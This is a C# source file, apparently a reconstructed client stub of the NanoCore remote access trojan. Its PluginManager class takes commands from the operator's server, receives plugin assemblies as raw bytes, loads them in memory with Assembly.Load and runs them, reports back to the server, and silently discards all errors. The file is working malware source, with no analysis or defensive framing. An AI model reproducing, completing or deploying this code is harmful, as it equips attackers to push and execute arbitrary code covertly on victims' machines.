using NanoCore.ClientPlugin;
using NanoCore.ClientPluginHost;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Security.Cryptography;

namespace stub
{
	class PluginManager
	{
		public static byte[] byte_0;
		public static byte[] byte_1;
		public static bool bool_0;

		public static byte[] CalcMD5(byte[] buffer)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			return md5CryptoServiceProvider.ComputeHash(buffer);
		}

		public static void HandleCommand(PacketData data)
		{
			switch (data.Command)
			{
				case 0:
					smethod_1(data.Buffer);
					break;
				case 1:
					smethod_2(data.Buffer);
					break;
				case 2:
					smethod_3(data.Buffer);
					break;
				case 3:
					smethod_4(data.Buffer);
					break;
			}
		}

		public static void smethod_1(object[] buffer)
		{
			byte[] byte_ = (byte[])buffer[0];
			bool bool_ = byte_1 == null || !smethod_5(byte_0, byte_);

			Core.SendMessage(Core.Client, true, CommandType.PluginCommand, 0, new object[] { bool_ });
		}

		public static void smethod_2(object[] buffer)
		{
			DateTime dateTime_ = (DateTime)buffer[0];
			byte[] byte_ = (byte[])buffer[1];

			byte_1 = byte_;
			byte_0 = CalcMD5(byte_1);
			Core.smethod_9();

			Core.SendMessage(Core.Client, true, CommandType.PluginCommand, 1, new object[0]);
		}

		public static void smethod_3(object[] buffer)
		{
			try
			{
				List<object> list = new List<object>();
				List<Guid> list2 = new List<Guid>();
				for (int i = 0; i < buffer.Length; i += 3)
				{
					Guid guid = (Guid)buffer[i];
					byte[] byte_ = (byte[])buffer[i + 1];
					bool flag = (bool)buffer[i + 2];
					list2.Add(guid);
					PluginInfo gclass = GetPluginData(guid);
					if (gclass == null)
					{
						list.Add(guid);
					}
					else
					{
						if (gclass.bool_0 != flag)
						{
							gclass.bool_0 = flag;
						}
						if (!smethod_5(gclass.byte_1, byte_))
						{
							list.Add(guid);
							bool_0 = true;
						}
					}
				}

				try
				{
					foreach (PluginInfo pi in Core.PluginInfos)
					{
						if (!list2.Contains(pi.Guid))
						{
							bool_0 = true;
							if (pi.bool_0)
							{
								//Class5.bool_1 = true;
							}
							if (pi.Plugin != null)
							{
								try
								{
									pi.Plugin.PluginUninstalling();
								}
								catch (Exception ex)
								{

								}
							}
						}
					}
				}
				finally
				{

				}
				if (list.Count == 0 && PluginManager.bool_0)
				{

				}
				else
				{
					Core.SendMessage(Core.Client, true, CommandType.PluginCommand, 2, list.ToArray());
				}
			}
			catch (Exception ex)
			{

			}
		}

		public static void smethod_4(object[] object_0)
		{
			List<PluginInfo> list = new List<PluginInfo>();
			int num = 0;
			int num2 = object_0.Length - 1;
			for (int i = num; i <= num2; i += 5)
			{
				PluginInfo gclass = new PluginInfo();
				gclass.Guid = (Guid)object_0[i];
				gclass.DateTime = (DateTime)object_0[i + 1];
				gclass.string_0 = (string)object_0[i + 2];
				gclass.bool_0 = (bool)object_0[i + 3];
				gclass.byte_0 = (byte[])object_0[i + 4];
				gclass.byte_1 = CalcMD5(gclass.byte_0);
				Core.PluginInfos.Add(gclass);
				list.Add(gclass);
				if (gclass.bool_0)
				{
					//Class5.bool_1 = true;
				}
			}
			if (bool_0)
			{
				return;
			}
			try
			{
				foreach (PluginInfo pi in list)
				{
					ParsePlugin(pi.byte_0, pi);
				}
			}
			finally
			{

			}
			Core.SendMessage(Core.Client, true, CommandType.PluginCommand, 3, new object[0]);
		}

		static bool smethod_5(byte[] byte_0, byte[] byte_1)
		{
			if (byte_0.Length != byte_1.Length)
			{
				return false;
			}
			int num = 0;
			int num2 = byte_1.Length - 1;
			for (int i = num; i <= num2; i++)
			{
				if (byte_0[i] != byte_1[i])
				{
					return false;
				}
			}
			return true;
		}

		public static PluginInfo GetPluginData(Guid guid)
		{
			int num = 0;
			int num2 = Core.PluginInfos.Count - 1;
			for (int i = num; i <= num2; i++)
			{
				if (Core.PluginInfos[i].Guid == guid)
				{
					return Core.PluginInfos[i];
				}
			}
			return null;
		}

		static Type GetPluginType(byte[] byte_0, Type[] type_0, Type[] type_1)
		{
			Assembly assembly = Assembly.Load(byte_0);
			foreach (Type type in assembly.GetTypes())
			{
				foreach (Type value in type.GetInterfaces())
				{
					if (Array.IndexOf<Type>(type_0, value) != -1)
					{
						return type;
					}
				}
				ConstructorInfo[] constructors = type.GetConstructors();
				if (constructors.Length == 1)
				{
					foreach (ParameterInfo parameterInfo in constructors[0].GetParameters())
					{
						if (Array.IndexOf<Type>(type_1, parameterInfo.ParameterType) != -1)
						{
							return type;
						}
					}
				}
			}
			return null;
		}

		static void ParsePlugin(byte[] bytes, PluginInfo pluginData)
		{
			try
			{
				Plugin plugin = new Plugin(pluginData.Guid, pluginData.string_0);
				pluginData.Plugin = plugin;
				Type type = GetPluginType(bytes, new Type[]
												{
													typeof(IClientNetwork),
													typeof(IClientData),
													typeof(IClientApp)
												},
												new Type[]
												{
													typeof(IClientDataHost),
													typeof(IClientNetworkHost),
													typeof(IClientUIHost),
													typeof(IClientLoggingHost),
													typeof(IClientAppHost)
												}
				);
				if (type == null)
				{
					throw new Exception("Client assembly does not meet plugin type requirements.");
				}

				List<object> list = new List<object>();
				ConstructorInfo constructorInfo = type.GetConstructors()[0];
				foreach (ParameterInfo parameterInfo in constructorInfo.GetParameters())
				{
					if (typeof(IClientDataHost).Equals(parameterInfo.ParameterType))
					{
						list.Add(new ClientDataHost(plugin));
					}
					else if (typeof(IClientNetworkHost).Equals(parameterInfo.ParameterType))
					{
						list.Add(new ClientNetworkHost(plugin));
					}
					else if (typeof(IClientUIHost).Equals(parameterInfo.ParameterType))
					{
						list.Add(new ClientUIHost(plugin));
					}
					else if (typeof(IClientLoggingHost).Equals(parameterInfo.ParameterType))
					{
						list.Add(new ClientLoggingHost(plugin));
					}
					else if (typeof(IClientAppHost).Equals(parameterInfo.ParameterType))
					{
						list.Add(new ClientAppHost(plugin));
					}
					else
					{
						list.Add(null);
					}
				}

				object instance = Activator.CreateInstance(type, list.ToArray());
				foreach (Type o in type.GetInterfaces())
				{
					if (typeof(IClientData).Equals(o))
					{
						plugin.ClientData = (IClientData)instance;
					}
					else if (typeof(IClientNetwork).Equals(o))
					{
						plugin.ClientNetwork = (IClientNetwork)instance;
					}
					else if (typeof(IClientApp).Equals(o))
					{
						plugin.ClientApp = (IClientApp)instance;
					}
				}

				if (!Core.PluginInfos.Contains(pluginData))
				{
					Core.PluginInfos.Add(pluginData);
				}
			}
			catch (Exception ex)
			{

			}
		}
	}
}